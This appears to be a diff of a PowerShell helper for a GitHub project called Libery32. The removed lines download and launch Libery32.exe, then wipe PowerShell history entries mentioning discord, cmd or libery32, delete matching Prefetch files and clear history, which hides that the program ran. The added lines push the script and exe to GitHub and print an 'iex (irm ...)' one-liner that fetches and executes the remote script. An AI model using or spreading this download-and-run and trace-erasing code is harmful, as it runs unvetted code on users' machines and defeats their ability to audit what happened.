@@ -1,37 +1,65 @@
-$exeUrls = @(
-    $ExeUrl,
-    'https://github.com/lubyralph6-maker/Libery32.ps1/releases/latest/download/Libery32.exe'
-)
-$downloaded = $false
-foreach ($url in $exeUrls) {
-foreach ($url in @($ExeUrl, 'https://github.com/lubyralph6-maker/Libery32.ps1/releases/latest/download/Libery32.exe')) {
-    if ([string]::IsNullOrWhiteSpace($url)) { continue }
-    try {
-        Write-Host ('Downloading: ' + $url) -ForegroundColor Cyan
+$ErrorActionPreference = 'Stop'
+
+$git = 'C:\Program Files\Git\bin\git.exe'
+if (-not (Test-Path $git)) {
+    Write-Host 'Git not found. Install Git for Windows first.' -ForegroundColor Red
+    Read-Host 'Press Enter'
+    exit 1
 }
-Write-Host 'Downloaded' -ForegroundColor Green
-$proc = Start-Process -FilePath $tempExe -PassThru
-$proc.WaitForExit()
-Start-Sleep -Seconds 2
-$historyPath = Join-Path $env:APPDATA 'Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt'
-if (Test-Path $historyPath) {
-    try {
-        $lines = Get-Content $historyPath
-        $filtered = $lines | Where-Object {
-            ($_ -notmatch 'discord') -and
-            ($_ -notmatch 'cmd') -and
-            ($_ -notmatch 'libery32') -and
-            ($_ -notmatch 'Libery32') -and
-            ($_ -notmatch $randomName)
-        }
-        $filtered | Set-Content -Path $historyPath -Encoding UTF8
-        $keep = Get-Content $historyPath | Where-Object { $_ -notmatch $pattern }
-        $keep | Set-Content -Path $historyPath -Encoding UTF8
-    } catch {}
+
+$project = Split-Path $PSScriptRoot -Parent
+$repoUrl = 'https://github.com/lubyralph6-maker/Libery32.ps1.git'
+$work = Join-Path $env:TEMP 'Libery32-github-fix'
+
+if (Test-Path $work) {
+    Remove-Item $work -Recurse -Force
 }
+
+Write-Host 'Cloning repo...' -ForegroundColor Cyan
+& $git clone $repoUrl $work
+
+Copy-Item (Join-Path $project 'Libery32.ps1') (Join-Path $work 'Libery32.ps1') -Force
+
+$exeSrc = Join-Path $project 'build\Release\Libery32.exe'
+if (Test-Path $exeSrc) {
+    Copy-Item $exeSrc (Join-Path $work 'Libery32.exe') -Force
+}
+
+$local = Get-Content (Join-Path $work 'Libery32.ps1') -Raw
+if (-not $local.StartsWith('param')) {
+    Write-Host 'Local Libery32.ps1 is invalid.' -ForegroundColor Red
+    exit 1
+}
+
+Write-Host ('Local script OK, length=' + $local.Length) -ForegroundColor Green
+
+Push-Location $work
 try {
-    Remove-Item ('C:\Windows\Prefetch\*' + $randomName + '*') -Force -ErrorAction SilentlyContinue
-    Remove-Item 'C:\Windows\Prefetch\*LIBERY32*' -Force -ErrorAction SilentlyContinue
-    Remove-Item 'C:\Windows\Prefetch\*discord*' -Force -ErrorAction SilentlyContinue
-} catch {}
-Clear-History
+    & $git add Libery32.ps1
+    if (Test-Path (Join-Path $work 'Libery32.exe')) {
+        & $git add Libery32.exe
+    }
+
+    & $git -c user.email='upload@local' -c user.name='upload' commit -m 'Fix Libery32.ps1 - upload complete script'
+
+    Write-Host 'Pushing to GitHub... (login if asked)' -ForegroundColor Cyan
+    & $git push origin main
+
+    Write-Host 'Push OK. Waiting for raw cache...' -ForegroundColor Green
+    Start-Sleep -Seconds 3
+
+    $remote = Invoke-RestMethod 'https://raw.githubusercontent.com/lubyralph6-maker/Libery32.ps1/main/Libery32.ps1'
+    if ($remote.StartsWith('param')) {
+        Write-Host 'VERIFY OK: GitHub file starts with param' -ForegroundColor Green
+        Write-Host ''
+        Write-Host "Run this:" -ForegroundColor Yellow
+        Write-Host "iex (irm 'https://raw.githubusercontent.com/lubyralph6-maker/Libery32.ps1/main/Libery32.ps1')"
+    } else {
+        Write-Host 'VERIFY FAILED: GitHub still broken. Wait 1 minute and test again.' -ForegroundColor Red
+    }
+}
+finally {
+    Pop-Location
+}
+
+Read-Host 'Press Enter to close'
